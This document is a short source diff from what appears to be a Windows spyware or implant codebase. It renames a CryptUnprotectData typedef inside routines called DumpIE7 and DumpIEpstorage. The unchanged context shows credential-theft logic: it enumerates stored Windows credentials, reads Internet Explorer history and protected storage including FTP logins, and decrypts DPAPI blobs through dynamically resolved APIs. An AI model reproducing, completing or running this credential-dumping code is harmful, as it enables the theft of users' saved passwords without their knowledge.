@@ -21,7 +21,7 @@ DEFINE_GUID(CLSID_CUrlHistory, 0x3C374A40L, 0xBAE4, 0x11CF, 0xBF, 0x7D, 0x00, 0x
 
 typedef BOOL (WINAPI *typeCredEnumerate)(WCHAR *, DWORD, DWORD *, PCREDENTIALW **);
 typedef VOID (WINAPI *typeCredFree)(PVOID);
-typedef BOOL (WINAPI *typeCryptUnprotectData)(DATA_BLOB *, LPWSTR *, DATA_BLOB *, PVOID, PVOID, DWORD, DATA_BLOB *);
+typedef BOOL (WINAPI *CryptUnprotectData_t)(DATA_BLOB *, LPWSTR *, DATA_BLOB *, PVOID, PVOID, DWORD, DATA_BLOB *);
 
 
 void GetHashStr(wchar_t *Password, char *HashStr)
@@ -144,7 +144,7 @@ void ParseIE7Data(DATA_BLOB *Data_blob, WCHAR *URL)
 int DumpIE7(void)
 {
     wchar_t *UrlHistory[URL_HISTORY_MAX];
-	typeCryptUnprotectData pfCryptUnprotectData = NULL;
+	CryptUnprotectData_t pfCryptUnprotectData = NULL;
 	typeCredEnumerate pfCredEnumerate = NULL;
 	typeCredFree pfCredFree = NULL;
 	PCREDENTIALW *CredentialCollection = NULL;
@@ -157,7 +157,7 @@ int DumpIE7(void)
     HKEY hKey;
 
 	if ( (hCrypt32DLL = LoadLibrary("crypt32.dll")) )  {
-		pfCryptUnprotectData = (typeCryptUnprotectData)HM_SafeGetProcAddress(hCrypt32DLL, (char *)"CryptUnprotectData");
+		pfCryptUnprotectData = (CryptUnprotectData_t)HM_SafeGetProcAddress(hCrypt32DLL, (char *)"CryptUnprotectData");
 	}
 	
 	if ( (hAdvapi32DLL = LoadLibrary("advapi32.dll")) ) {
@@ -358,11 +358,11 @@ void DumpIEpstorage(void)
 						// FTP Authentication
 						if (!strncmp("DPAPI: ", szItemName, strlen("DPAPI: "))) {
 							DATA_BLOB dbin, dbout;
-							typeCryptUnprotectData pfCryptUnprotectData = NULL;
+							CryptUnprotectData_t pfCryptUnprotectData = NULL;
 							HMODULE hCrypt32DLL = NULL; 
 
 							if ( (hCrypt32DLL = LoadLibrary("crypt32.dll")) )  
-								pfCryptUnprotectData = (typeCryptUnprotectData)HM_SafeGetProcAddress(hCrypt32DLL, "CryptUnprotectData");
+								pfCryptUnprotectData = (CryptUnprotectData_t)HM_SafeGetProcAddress(hCrypt32DLL, "CryptUnprotectData");
 
 							if (pfCryptUnprotectData) {
 								dbin.cbData = psDataLen;
